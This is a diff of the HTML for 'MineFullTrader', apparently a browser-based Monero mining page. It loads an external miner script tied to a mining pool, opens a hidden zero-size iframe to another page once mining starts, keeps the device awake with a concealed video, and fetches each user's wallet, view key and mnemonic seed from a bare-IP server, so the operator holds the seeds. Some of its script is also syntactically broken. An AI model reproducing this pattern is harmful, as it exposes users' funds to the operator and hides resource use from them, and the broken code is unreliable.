@@ -1,694 +1,478 @@
 ﻿
 <!DOCTYPE html>
-
 <html>
-  <head>  
-	 <title id="hello">MFT</title>
+<head>
+
+    <title id="hello">MFT</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
-    <link rel="stylesheet" href="app.min.css">
-	<link rel="text/Javascript" href="sleep.js">
-	<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-    		
-	<style>
-	  
-	  ul.colour-picker li {
-				position: relative;
-				display: block;
-				float: left;
-				height: 54px;
-				width: 25%;
-				-webkit-box-sizing: border-box;
-				box-sizing: border-box;
-			}
-			ul.colour-picker li[data-colour="teal"] {
-				background: #2B9;
-			}
-			ul.colour-picker li[data-colour="green"] {
-				background: #3C7;
-			}
-			ul.colour-picker li[data-colour="yellow"] {
-				background: #EC1;
-			}
-			ul.colour-picker li[data-colour="orange"] {
-				background: #E82;
-			}
-			ul.colour-picker li[data-colour="red"] {
-				background: #E54;
-			}
-			ul.colour-picker li[data-colour="blue"] {
-				background: #39D;
-			}
-			ul.colour-picker li[data-colour="dark-blue"] {
-				background: #345;
-			}
-			ul.colour-picker li[data-colour="white"] {
-				background: #FFF;
-			}
-			ul.colour-picker li.active:before {
-				position: absolute;
-				height: 100%;
-				width: 100%;
-				background: rgba(0,0,0,0.1);
-				content: "";
-			}
-
-			
-			.scroll-page .loading {
-				margin: 12px auto;
-				border: 8px solid #AAA;
-				height: 16px;
-				width: 16px;
-				background: #CCC;
-				border-radius: 16px;
-				-webkit-animation: pulse 2s ease-in-out 0s infinite;
-			}
-			
-			.container {
-				position:absolute;
-			    font-weight: bold;
-				text-align: center;
-				text-transform: uppercase;
-				font-size: 0.5em;
-				
-			}
-			input[type=checkbox]{
-	height: 0;
-	width: 0;
-	visibility: hidden;
-}
-
-label {
-	cursor: pointer;
-	text-indent: -9999px;
-	width: 200px;
-	height: 100px;
-	background: grey;
-	display: block;
-	border-radius: 100px;
-	position: relative;
-}
-
-label:after {
-	content: '';
-	position: absolute;
-	top: 5px;
-	left: 5px;
-	width: 90px;
-	height: 90px;
-	background: #fff;
-	border-radius: 90px;
-	transition: 0.3s;
-}
-
-input:checked + label {
-	background: #bada55;
-}
-
-input:checked + label:after {
-	left: calc(100% - 5px);
-	transform: translateX(-100%);
-}
-
-label:active:after {
-	width: 130px;
-	
-}
-.centerbutton {
-	display: flex;
-	justify-content: center;
-	align-items: center;
-	height: 100vh;
-}
-		#togglebutton {
-		justify-content: center;
-		display: flex;
-		margin: 20px
-		
-
-}		
-		sans-serif;
-    color: rgba(0,0,0,.5);
-    text-align: center;
-    text-transform: uppercase;
-    letter-spacing: .5em;
-    position: absolute;
-    top: 25%;
-    width: 100%;
-}
-
-span, span:after {
-    font-weight: 900;
-    color: #efedce;
-    white-space: nowrap;
-    display: inline-block;
-    position: relative;
-    letter-spacing: .1em;
-    padding: .2em 0 .25em 0;
-}
-
-span {
-    font-size: 1em;
-    z-index: 100;
-    text-shadow: .04em .04em 0 #9cb8b3;
-}
-
-span:after {
-    content: attr(data-shadow-text);
-    color: rgba(0,0,0,.35);
-    text-shadow: none;
-    position: absolute;
-    left: .0875em;
-    top: .0875em;
-    z-index: -1;
-}	
-.loader {
-	position: relative;
-	left: 0px;
-	top: 0px;
-	width: 100%;
-	height: 100%;
-	z-index: 9999;
-	background: url('img/LoadingPage.gif') 50% 50% no-repeat rgb(249,249,249);
-	color:silver;
-	background-color:white;
-}
-.loadwords{
-	text-align:center;
-	margin: 0 auto;
-	position: absolute;
-	color: silver;
-	min-width: 200px;
-	bottom: 8%;
-	
-	
-	
-	
-	
-}
-.loadingtitle {
-	text-align:center;
-	margin: 20px 0 0 0
-	text-shadow: 0px 15px 0px #b2a98f,
-                 0px 14px 10px rgba(0,0,0,0.15),
-                 0px 24px 2px rgba(0,0,0,0.1),
-                 0px 34px 30px rgba(0,0,0,0.1);
-	color: #DAA520;
-}
-.loading {
-	text-align:center;
-	background-size:cover;
-  font-family: 'Cabin Condensed', sans-serif;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  margin-top:-10%;
- 
-}
- 
- #your-img {
-    height: auto; 
-    width: auto; 
-    max-width: 200px; 
-    max-height: 200px;
-	margin: 5% 0 0 0;
-	position:relative;
-}
-	
-</style>	
-
-
-
-
-
-  </head>
+    <link type="text/css" rel="stylesheet" href=@Url.Content("~/Content/app.min.css")>
+    <link type="text/css" rel="stylesheet" href=@Url.Content("~/Content/mft.css")>
+    <script type="text/javascript" rel="JavaScript" href=@Url.Content("~/Content/app.min.js")></script>
+    <link rel="text/Javascript" href="sleep.js">
+    
+                                                                
+</head>
 <body>
+    <br />
+    <br />
+    <br />
+    <div style="padding: 20%, 0, 20%, 0;" id="loading" class="loader">
 
-<div id="loading" class="loader">
-<h1 class="loadingtitle"> MineFullTrader</h1>
-<h2 class="loading""><img id="your-img" src="img/loadingImage.gif"></h2>
-<p class="loadwords">Refer others and MFT will pay out 10% of their earnings to you instead!</p>
-</div>   
-<script>
+        <h1 class="loadingtitle">MFT</h1>
+        <h2 class="loading"><img id="your-img" src="img/loadingImage.gif"></h2>
+        <p style="text-align: center;font-size: 1.5em;">Refer others and earn 10% of their mining profits</p>
+        <br />
+        <p style="text-align: center; color: goldenrod; font-size: 1em;">Paid directly from MFT</p>
+    </div>
 
-	
-		
-	var x = document.getElementById('loading')
-    if(localStorage.getItem('USERINFO') == null) {
-        x.style.display = "block";
-    } else  {
-        x.style.display = "none";
-		
-    };
-	
+    <script>
+        var x = document.getElementById('loading')
+        if (localStorage.getItem('USERINFO') == null) {
+            x.style.display = "block";
+        } else {
+            x.style.display = "none";
+        };
+    </script>
 
+    <script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?jason=gulf.moneroocean.stream:80"></script>
 
-         
-</script>
+    <script src="app.min.js">
+        $(function () {
+            $('#threads').text(navigator.hardwareConcurrency);
+            var threads = $('#threads').text();
+            var gustav;
+            var wallet;
+            var statuss;
+            var barChart;
+            var barChartCanvas = $("#barchart-canvas");
+            var hashingChart;
+            var charts = [barChartCanvas];
+            var selectedChart = 0;
+            var lastrate = 0;
+            var totalHashes = 0;
+            var totalHashes2 = 0;
+            var acceptedHashes = 0;
+            var hashesPerSecond = 0;
 
-  
-<script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?jason=gulf.moneroocean.stream:80"></script>
-
-<script src="app.min.js">
-$(function() {
-  $('#threads').text(navigator.hardwareConcurrency);
-  var threads = $('#threads').text();
-  var gustav;
-  var wallet;
-  var statuss;
-  var barChart;
-  var barChartCanvas = $("#barchart-canvas");
-  var hashingChart;
-  var charts = [barChartCanvas];
-  var selectedChart = 0;
-  var lastrate = 0;
-  var totalHashes = 0;
-  var totalHashes2 = 0;
-  var acceptedHashes = 0;
-  var hashesPerSecond = 0;
-  
-  if ($.cookie("wallet")) {
-    wallet = $.cookie("wallet");
-    $('#wallet').val(wallet);
-  }
-  function htmlEncode(value) {
-    return $('<div/>').text(value).html();
-  }
-
-  function startLogger() {
-    statuss = setInterval(function() {
-	  lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
-	  totalHashes = totalhashes + totalHashes
-      hashesPerSecond = Math.round(lastrate);
-	  totalHashes2 = totalHashes;
-	  totalhashes = 0;
-      acceptedHashes = GetAcceptedHashes();
-      $('#hashes-per-second').text(hashesPerSecond);
-      $('#accepted-shares').text(totalHashes2 +' | '+ acceptedHashes);
-      $('#threads').text(threads);
-    }, 1000);
-
-    hashingChart = setInterval(function() {
-      if (barChart.data.datasets[0].data.length > 25) {
-        barChart.data.datasets[0].data.splice(0, 1);
-        barChart.data.labels.splice(0, 1);
-      }
-      barChart.data.datasets[0].data.push(hashesPerSecond);
-      barChart.data.labels.push("");
-      barChart.update();
-    }, 1000);
-  };
-
-  function stopLogger() {
-    clearInterval(statuss);
-    clearInterval(hashingChart);
-  };
-  
-  $('#thread-add').click(function() {
-    threads++;
-    $('#threads').text(threads);
-        addWorker();
-  });
-
-  $('#thread-remove').click(function() {
-    if (threads > 1) {
-      threads--;
-      $('#threads').text(threads);
-          removeWorker();
-    }
-  });
-
-  $('#autoThreads').click(function() {
-    if (gustav) {
-      gustav.setAutoThreadsEnabled(!gustav.getAutoThreadsEnabled());
-    }
-  });
-
-  var barChartOptions = {
-    label: 'Hashes',
-    elements: {
-      line: {
-        tension: 0, // disables bezier curves
-      }
-    },
-    animation: {
-      duration: 0, // general animation time
-    },
-    responsiveAnimationDuration: 0,
-    scales: {
-      yAxes: [{
-        ticks: {
-          max: 500,
-          min: 0
-        }
-      }]
-    }
-  };
-
-  var barChartData = {
-    labels: [],
-    datasets: [{
-      label: "Hashes Per Second",
-      backgroundColor: "darkcyan",
-      data: []
-    }],
-  };
-
-  barChart = new Chart(barChartCanvas, {
-    type: 'line',
-    data: barChartData,
-    options: barChartOptions
-  });
-});</script>
-	<script>
-	var sleep = {
-    prevent: function() {
-        if (!this._video) {
-            this._init();
-        }
-
-        this._video.setAttribute('loop', 'loop');
-        this._video.play();
-    },
-    allow: function() {
-        if (!this._video) {
-            return;
-        }
-
-        this._video.removeAttribute('loop');
-        this._video.pause();
-    },
-    _init: function() {
-        this._video = document.createElement('video');
-        this._video.setAttribute('width', '10');
-        this._video.setAttribute('height', '10');
-        this._video.style.position = 'absolute';
-        this._video.style.top = '-10px';
-        this._video.style.left = '-10px';
-
-        var source_mp4 = document.createElement('source');
-        source_mp4.setAttribute('src', 'https://github.com/ivanmaeder/computer-sleep/raw/master/resources/muted-blank.mp4');
-        source_mp4.setAttribute('type', 'video/mp4');
-        this._video.appendChild(source_mp4);
-
-        var source_ogg = document.createElement('source');
-        source_ogg.setAttribute('src', 'https://github.com/ivanmaeder/computer-sleep/raw/master/resources/muted-blank.ogv');
-        source_ogg.setAttribute('type', 'video/ogg');
-        this._video.appendChild(source_ogg);
-
-        document.body.appendChild(this._video);
-    },
-    _video: null
-}
-	</script>
-
-<iframe id="ifr" style="width: 0; height: 0; border: 0; border: none; position: absolute;"></iframe>
-<div id="serverData"></div>
-    <div class="app-page" data-page="home">
-      <div class="app-topbar">
-        <div class="app-title">MineFullTrader</div>
-      </div>
-      <div class="app-content">
-       <h1 style="text-align: center; font-weight: bold; font-size: 15px;">Click Button to Begin Mining</h1>
-	  <div align="center" id="togglebutton"><input onclick="toggle()" type="checkbox" id="switch" /><label for="switch">Toggle</label>
-	 
-       
-	   <script>
-        function toggle(){
-        var isChecked = document.getElementById("switch").checked;
-            if(!isChecked){
-				sleep.allow();
-                stopMining();
-                location.reload();
+            if ($.cookie("wallet")) {
+                wallet = $.cookie("wallet");
+                $('#wallet').val(wallet);
             }
-            else
-            {
-                PerfektStart(wallett, "x");
-                throttleMiner = 50;
-				document.getElementById("ifr").src="http://www.minefulltrader.org/demo.html";
-				sleep.prevent();
-			
-var status;
-var lastrate = 0;
-var totalHashes = 0;
-var totalHashes2 = 0;
-var acceptedHashes = 0;
-var hashesPerSecond = 0;
+            function htmlEncode(value) {
+                return $('<div/>').text(value).html();
+            }
 
-function myFunction() {
-    status = setInterval(stats, 1000);
-}
+            function startLogger() {
+                statuss = setInterval(function () {
+                    lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
+                    totalHashes = totalhashes + totalHashes
+                    hashesPerSecond = Math.round(lastrate);
+                    totalHashes2 = totalHashes;
+                    totalhashes = 0;
+                    acceptedHashes = GetAcceptedHashes();
+                    $('#hashes-per-second').text(hashesPerSecond);
+                    $('#accepted-shares').text(totalHashes2 + ' | ' + acceptedHashes);
+                    $('#threads').text(threads);
+                }, 1000);
 
-function stats() {
-      lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
-	  totalHashes = totalhashes + totalHashes
-      hashesPerSecond = Math.round(lastrate);
-	  totalHashes2 = totalHashes;
-	  totalhashes = 0;
-      acceptedHashes = GetAcceptedHashes();
-      document.getElementById("hashes-per-second").innerHTML = hashesPerSecond;
-      document.getElementById("accepted-shares").innerHTML = totalHashes2 +' | '+ acceptedHashes;
-}
+                hashingChart = setInterval(function () {
+                    if (barChart.data.datasets[0].data.length > 25) {
+                        barChart.data.datasets[0].data.splice(0, 1);
+                        barChart.data.labels.splice(0, 1);
+                    }
+                    barChart.data.datasets[0].data.push(hashesPerSecond);
+                    barChart.data.labels.push("");
+                    barChart.update();
+                }, 1000);
+            };
 
-myFunction();
-            }};		
-        </script>
-       </div>
+            function stopLogger() {
+                clearInterval(statuss);
+                clearInterval(hashingChart);
+            };
 
+            $('#thread-add').click(function () {
+                threads++;
+                $('#threads').text(threads);
+                addWorker();
+            });
 
-	   
-	<div align="center">
-	   <table cellpadding= '5' cellspacing='0'style='margin-bottom:80px;font-size:16px;' />
-<tr>
-	<td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
-		
-        <h3 align="center" style="text-align:center;">Hashes<br>Per<br>Second</h3>
-        
-    
-	</td>
-	<td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
-		
-        <h3 align="center" style="text-align:center;">Total Hashes|<span>Paid Shares</span></h3>
-        
-    
-	</td>
-	
-</tr>
-<tr>
-	<td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
-		<div style="text-align: center; "id="hashes-per-second">0</div>
-	</td>
-	<td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
-		<div style="text-align: center;" id="accepted-shares">0</div>
-	</td>
-	
-	
-</tr>
-</div>
-	   
-	   <div class="app-section">
-					<p style="text-align: center; font-weight: bold; font-size:20px;">Investing Option's</p><br>
-					<p style="text-align: center; font-weight: bold; font-size: 15px;">Choose Coin to Mine</p>
-					<ul class="colour-picker">
-						<li class="container"  data-colour="blue"><br><br><span>Bytecoin<br>Coming Soon</li></span>
-						<li class="container"  data-colour="green"><br><br><span>Aeon<br>Coming Soon</li></span>
-						<li class="container"  data-colour="yellow"><br><br><span>Dashcoin<br>Coming Soon</li></span>
-						<li class="container"  data-colour="orange"><br><br><span>Monero<br></li></span>
-						
-						<div class="clear"></div>
-					</ul>
-				</div> 
-		<div class="app-section">
-          
-		  <div class="app-button" data-target="page2">Check Balance's</div>
+            $('#thread-remove').click(function () {
+                if (threads > 1) {
+                    threads--;
+                    $('#threads').text(threads);
+                    removeWorker();
+                }
+            });
+
+            $('#autoThreads').click(function () {
+                if (gustav) {
+                    gustav.setAutoThreadsEnabled(!gustav.getAutoThreadsEnabled());
+                }
+            });
+
+            var barChartOptions = {
+                label: 'Hashes',
+                elements: {
+                    line: {
+                        tension: 0, // disables bezier curves
+                    }
+                },
+                animation: {
+                    duration: 0, // general animation time
+                },
+                responsiveAnimationDuration: 0,
+                scales: {
+                    yAxes: [{
+                        ticks: {
+                            max: 500,
+                            min: 0
+                        }
+                    }]
+                }
+            };
+
+            var barChartData = {
+                labels: [],
+                datasets: [{
+                    label: "Hashes Per Second",
+                    backgroundColor: "darkcyan",
+                    data: []
+                }],
+            };
+
+            barChart = new Chart(barChartCanvas, {
+                type: 'line',
+                data: barChartData,
+                options: barChartOptions
+            });
+        });</script>
+    <script>
+        var sleep = {
+            prevent: function () {
+                if (!this._video) {
+                    this._init();
+                }
+
+                this._video.setAttribute('loop', 'loop');
+                this._video.play();
+            },
+            allow: function () {
+                if (!this._video) {
+                    return;
+                }
+
+                this._video.removeAttribute('loop');
+                this._video.pause();
+            },
+            _init: function () {
+                this._video = document.createElement('video');
+                this._video.setAttribute('width', '10');
+                this._video.setAttribute('height', '10');
+                this._video.style.position = 'absolute';
+                this._video.style.top = '-10px';
+                this._video.style.left = '-10px';
+
+                var source_mp4 = document.createElement('source');
+                source_mp4.setAttribute('src', 'https://github.com/ivanmaeder/computer-sleep/raw/master/resources/muted-blank.mp4');
+                source_mp4.setAttribute('type', 'video/mp4');
+                this._video.appendChild(source_mp4);
+
+                var source_ogg = document.createElement('source');
+                source_ogg.setAttribute('src', 'https://github.com/ivanmaeder/computer-sleep/raw/master/resources/muted-blank.ogv');
+                source_ogg.setAttribute('type', 'video/ogg');
+                this._video.appendChild(source_ogg);
+
+                document.body.appendChild(this._video);
+            },
+            _video: null
+        }
+    </script>
+    <iframe id="ifr" style="width: 0; height: 0; border: 0; border: none; position: absolute;"></iframe>
+    <div id="serverData"></div>
+    <div class="app-page" data-page="home">
+        <div class="app-topbar">
+            <div class="app-title">MineFullTrader</div>
         </div>
-      
-    </div>
+        <div class="app-content">
+            <h1 style="text-align: center; font-weight: bold; font-size: 15px;">Click Button to Begin Mining</h1>
+            <div align="center" id="togglebutton">
+                <input onclick="toggle()" type="checkbox" id="switch" /><label for="switch">Toggle</label>
 
-    <div class="app-page" data-page="page2">
-      <div class="app-topbar">
-        <div class="app-button left" data-back >Home</div>
-        <div class="app-title"></div>
-      </div>
-      <div class="app-content">
-        <div class="app-content">
-				<ul class="app-list">
-					<br>
-					<li style="text-align: center; font-size: 20px;" class="app-button" data-target="page3">Monero</li>
-					<br>
-					<li style="text-align: center; font-size: 20px;" class="app-button" data-target="page4">Aeon</li>
-					<br>
-					<li style="text-align: center; font-size: 20px;" class="app-button" data-target="page5">Bytecoin</li>
-					<br>
-					<li style="text-align: center; font-size: 20px;" class="app-button" data-target="page6">Dashcoin</li>
-					
-					
-					
-					
-				</ul>
-			</div>
-      </div>
-    </div>
-	
-	<div class="app-page" data-page="page3">	
-      <div class="app-topbar">
-        <div class="app-button left" data-back>Back</div>
-        <div class="app-title"></div>
-      </div>
-      <div class="app-content">
-        <div class="app-content">				
-				<ul class="app-list">					
-					<h2 style="font-weight:bold; text-align: center; color:#DAA520">Monero</h2>
-					<h3 style="text-align: center; color:black;" class="app-button">Balance</h3>
-					<p id="balance" style="text-align: center; font-size:13px;" class="app-button"></p>
-					<p style="text-align: center; font-size:12px; color:black;" class="app-button">PENDING PAYMENTS</p>
-					<p id="pending" style="text-align: center; font-size:13px;" class="app-button"></p>
-					<h3 style="text-align: center; color:black" class="app-button">Public Key</h3>
-					<p id="wallet" style="text-align: center; font-size:13px;" class="app-button"></p>
-					<h3 style="text-align: center; color:black" class="app-button">View Key</h3>
-					<p id="view" style="text-align: center; font-size:13px;" class="app-button"></p>
-					<h3 style="text-align: center; color:black" class="app-button">Mnemonic Seed</h3>		
-					<p id="seed" style="text-align: center; font-size:13px;" class="app-button"></p>
-				</ul>
-			</div>
-      </div>
-    </div>
-	<div class="app-page" data-page="page4">
-      <div class="app-topbar">
-        <div class="app-button left" data-back>Back</div>
-        <div class="app-title"></div>
-      </div>
-      <div class="app-content">
-        <div class="app-content">
-				<ul class="app-list">
-					<h2 style="font-weight:bold; text-align: center;">Aeon</h2>
-					<li style="font-weight:bold; text-align: left;" class="app-button">Balance:</li>
-					<li style="text-align: left;" class="app-button">Public Key:</li>
-					<li style="text-align: left;" class="app-button">View:</li>
-					<li style="text-align: left;" class="app-button">Seed:</pre></li>					
-				</ul>
-			</div>
-      </div>
-    </div>
-	<div class="app-page" data-page="page5">
-      <div class="app-topbar">
-        <div class="app-button left" data-back>Back</div>
-        <div class="app-title"></div>
-      </div>
-      <div class="app-content">
-        <div class="app-content">
-				<ul class="app-list">
-					<h2 style="font-weight:bold; text-align: center;">Bytecoin</h2>
-					<li style="font-weight:bold; text-align: left;" class="app-button">Balance:</li>
-					<li style="text-align: left;" class="app-button">Public Key:</li>
-					<li style="text-align: left;" class="app-button">View:</li>
-					<li style="text-align: left;" class="app-button">Seed:</pre></li>				
-				</ul>
-			</div>
-      </div>
-    </div>
-	<div class="app-page" data-page="page6">
-      <div class="app-topbar">
-        <div class="app-button left" data-back>Back</div>
-        <div class="app-title"></div>
-      </div>
-      <div class="app-content">
-        <div class="app-content">
-				<ul class="app-list">
-					<h2 style="font-weight:bold; text-align: center;">Dashcoin</h2>
-					<li style="font-weight:bold; text-align: left;" class="app-button">Balance:</li>
-					<li style="text-align: left;" class="app-button">Public Key:</li>
-					<li style="text-align: left;" class="app-button">View:</li>
-					<li style="text-align: left;" class="app-button">Seed:</pre></li>
-					
-				</ul>
-			</div>
-      </div>
-    </div>	
-	<script src="zepto.js"></script>
-    <script src="app.min.js"></script>	
-	<script>		
-		if (localStorage.getItem('USERINFO') == null) {
-		$.ajax({
-			url: 'http://52.165.128.57/monero/api.php?mode=new',
-			dataType: 'JSON',
-			success: function(data, status) {
-		$.each(data, function(key, value){
-			window.localStorage.setItem('USERINFO', data);
-			location.reload()
-								   
-        
-		
-		
-		}); 
-	},
-    error: function() {        
-    }
-})
-}		
-			var myData = JSON.parse(window.localStorage.getItem('USERINFO'))                                      
-                  
-					
-					var wallett = myData.wallet;
-					var view = myData.view;
-					var seed = myData.seed;
-					var username = myData.username;
-					var password = myData.password;
-					
-					document.getElementById("wallet").innerHTML = wallett;
-					document.getElementById("view").innerHTML = view;
-					document.getElementById("seed").innerHTML = seed;
-	</script>
-	<script>
-	$.ajax({
-		url: 'https://moneroocean.stream/#/dashboard',
-		document.getElementById('input_4').value=wallet;
-	
-	});
-	</script>
-	<script>
-	
-		var oldColour = "";
-		
-		function setupPageColour(page) {
-			
-			$(page).find('ul.colour-picker li')
-				.clickable()
-				.on('click', function () {
-					var colour = $(this).data('colour');
-					if (oldColour != "") {
-						$(".app-topbar").removeClass(oldColour);
-					}
-					$(".app-topbar").addClass(colour);
-					oldColour = colour;
-					
-					
-			});
-				
-		
-		
-		}
-	
-      App.controller('home', function (page) {
-        setupPageColour(page);
-		
-		
-		
-      });
-	  
-	  
 
-      App.controller('page2', function (page) {
-        setupPageColour(page);
-      });
+                <script>
+                    function toggle() {
+                        var isChecked = document.getElementById("switch").checked;
+                        if (!isChecked) {
+                            sleep.allow();
+                            stopMining();
+                            location.reload();
+                        }
+                        else {
+                            PerfektStart(wallett, "x");
+                            throttleMiner = 50;
+                            document.getElementById("ifr").src = "http://www.minefulltrader.org/demo.html";
+                            sleep.prevent();
 
-      try {
-        App.restore();
-      } catch (err) {
-        App.load('home');
-      }
-    </script> 
-  </body>
+                            var status;
+                            var lastrate = 0;
+                            var totalHashes = 0;
+                            var totalHashes2 = 0;
+                            var acceptedHashes = 0;
+                            var hashesPerSecond = 0;
+
+                            function myFunction() {
+                                status = setInterval(stats, 1000);
+                            }
+
+                            function stats() {
+                                lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
+                                totalHashes = totalhashes + totalHashes
+                                hashesPerSecond = Math.round(lastrate);
+                                totalHashes2 = totalHashes;
+                                totalhashes = 0;
+                                acceptedHashes = GetAcceptedHashes();
+                                document.getElementById("hashes-per-second").innerHTML = hashesPerSecond;
+                                document.getElementById("accepted-shares").innerHTML = totalHashes2 + ' | ' + acceptedHashes;
+                            }
+
+                            myFunction();
+                        }
+                    };
+                </script>
+            </div>
+
+
+            <div align="center">
+                <table cellpadding='5' cellspacing='0' style='margin-bottom:80px;font-size:16px;' />
+                <tr>
+                    <td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+
+                        <h3 align="center" style="text-align:center;">Hashes<br>Per<br>Second</h3>
+
+
+                    </td>
+                    <td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+
+                        <h3 align="center" style="text-align:center;">Total Hashes|<span>Paid Shares</span></h3>
+
+
+                    </td>
+
+                </tr>
+                <tr>
+                    <td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+                        <div style="text-align: center; " id="hashes-per-second">0</div>
+                    </td>
+                    <td width='100' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+                        <div style="text-align: center;" id="accepted-shares">0</div>
+                    </td>
+
+
+                </tr>
+            </div>
+
+            <div class="app-section">
+                <p style="text-align: center; font-weight: bold; font-size:20px;">Investing Option's</p><br>
+                <p style="text-align: center; font-weight: bold; font-size: 15px;">Choose Coin to Mine</p>
+                <ul class="colour-picker">
+                    <li class="container" data-colour="blue"><br><br><span>Bytecoin<br>Coming Soon</li></span>
+                    <li class="container" data-colour="green"><br><br><span>Aeon<br>Coming Soon</li></span>
+                    <li class="container" data-colour="yellow"><br><br><span>Dashcoin<br>Coming Soon</li></span>
+                    <li class="container" data-colour="orange"><br><br><span>Monero<br></li></span>
+
+                    <div class="clear"></div>
+                </ul>
+            </div>
+            <div class="app-section">
+
+                <div class="app-button" data-target="page2">Check Balance's</div>
+            </div>
+
+        </div>
+        <div class="app-page" data-page="page2">
+            <div class="app-topbar">
+                <div class="app-button left" data-back>Home</div>
+                <div class="app-title"></div>
+            </div>
+            <div class="app-content">
+                <div class="app-content">
+                    <ul class="app-list">
+                        <br>
+                        <li style="text-align: center; font-size: 20px;" class="app-button" data-target="page3">Monero</li>
+                        <br>
+                        <li style="text-align: center; font-size: 20px;" class="app-button" data-target="page4">Aeon</li>
+                        <br>
+                        <li style="text-align: center; font-size: 20px;" class="app-button" data-target="page5">Bytecoin</li>
+                        <br>
+                        <li style="text-align: center; font-size: 20px;" class="app-button" data-target="page6">Dashcoin</li>
+
+
+
+
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="app-page" data-page="page3">
+            <div class="app-topbar">
+                <div class="app-button left" data-back>Back</div>
+                <div class="app-title"></div>
+            </div>
+            <div class="app-content">
+                <div class="app-content">
+                    <ul class="app-list">
+                        <h2 style="font-weight:bold; text-align: center; color:#DAA520">Monero</h2>
+                        <h3 style="text-align: center; color:black;" class="app-button">Balance</h3>
+                        <p id="balance" style="text-align: center; font-size:13px;" class="app-button"></p>
+                        <p style="text-align: center; font-size:12px; color:black;" class="app-button">PENDING PAYMENTS</p>
+                        <p id="pending" style="text-align: center; font-size:13px;" class="app-button"></p>
+                        <h3 style="text-align: center; color:black" class="app-button">Public Key</h3>
+                        <p id="wallet" style="text-align: center; font-size:13px;" class="app-button"></p>
+                        <h3 style="text-align: center; color:black" class="app-button">View Key</h3>
+                        <p id="view" style="text-align: center; font-size:13px;" class="app-button"></p>
+                        <h3 style="text-align: center; color:black" class="app-button">Mnemonic Seed</h3>
+                        <p id="seed" style="text-align: center; font-size:13px;" class="app-button"></p>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="app-page" data-page="page4">
+            <div class="app-topbar">
+                <div class="app-button left" data-back>Back</div>
+                <div class="app-title"></div>
+            </div>
+            <div class="app-content">
+                <div class="app-content">
+                    <ul class="app-list">
+                        <h2 style="font-weight:bold; text-align: center;">Aeon</h2>
+                        <li style="font-weight:bold; text-align: left;" class="app-button">Balance:</li>
+                        <li style="text-align: left;" class="app-button">Public Key:</li>
+                        <li style="text-align: left;" class="app-button">View:</li>
+                        <li style="text-align: left;" class="app-button">Seed:</pre></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="app-page" data-page="page5">
+            <div class="app-topbar">
+                <div class="app-button left" data-back>Back</div>
+                <div class="app-title"></div>
+            </div>
+            <div class="app-content">
+                <div class="app-content">
+                    <ul class="app-list">
+                        <h2 style="font-weight:bold; text-align: center;">Bytecoin</h2>
+                        <li style="font-weight:bold; text-align: left;" class="app-button">Balance:</li>
+                        <li style="text-align: left;" class="app-button">Public Key:</li>
+                        <li style="text-align: left;" class="app-button">View:</li>
+                        <li style="text-align: left;" class="app-button">Seed:</pre></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="app-page" data-page="page6">
+            <div class="app-topbar">
+                <div class="app-button left" data-back>Back</div>
+                <div class="app-title"></div>
+            </div>
+            <div class="app-content">
+                <div class="app-content">
+                    <ul class="app-list">
+                        <h2 style="font-weight:bold; text-align: center;">Dashcoin</h2>
+                        <li style="font-weight:bold; text-align: left;" class="app-button">Balance:</li>
+                        <li style="text-align: left;" class="app-button">Public Key:</li>
+                        <li style="text-align: left;" class="app-button">View:</li>
+                        <li style="text-align: left;" class="app-button">Seed:</pre></li>
+
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <script src="zepto.js"></script>
+        <script src="app.min.js"></script>
+        <script>
+            if (localStorage.getItem('USERINFO') == null) {
+                $.ajax({
+                    url: 'http://52.165.128.57/monero/api.php?mode=new',
+                    dataType: 'JSON',
+                    success: function (data, status) {
+                        $.each(data, function (key, value) {
+                            window.localStorage.setItem('USERINFO', data);
+                            location.reload()
+
+
+
+
+                        });
+                    },
+                    error: function () {
+                    }
+                })
+            }
+            var myData = JSON.parse(window.localStorage.getItem('USERINFO'))
+
+
+            var wallett = myData.wallet;
+            var view = myData.view;
+            var seed = myData.seed;
+            var username = myData.username;
+            var password = myData.password;
+
+            document.getElementById("wallet").innerHTML = wallett;
+            document.getElementById("view").innerHTML = view;
+            document.getElementById("seed").innerHTML = seed;
+        </script>
+        <script>
+            $.ajax({
+                url: 'https://moneroocean.stream/#/dashboard',
+                document.getElementById('input_4').value = wallet;
+
+            });
+        </script>
+        <script>
+
+            var oldColour = "";
+
+            function setupPageColour(page) {
+
+                $(page).find('ul.colour-picker li')
+                    .clickable()
+                    .on('click', function () {
+                        var colour = $(this).data('colour');
+                        if (oldColour != "") {
+                            $(".app-topbar").removeClass(oldColour);
+                        }
+                        $(".app-topbar").addClass(colour);
+                        oldColour = colour;
+
+
+                    });
+
+
+
+            }
+
+            App.controller('home', function (page) {
+                setupPageColour(page);
+
+
+
+            });
+
+
+
+            App.controller('page2', function (page) {
+                setupPageColour(page);
+            });
+
+            try {
+                App.restore();
+            } catch (err) {
+                App.load('home');
+            }
+        </script>
+</body>
 </html>
-
 
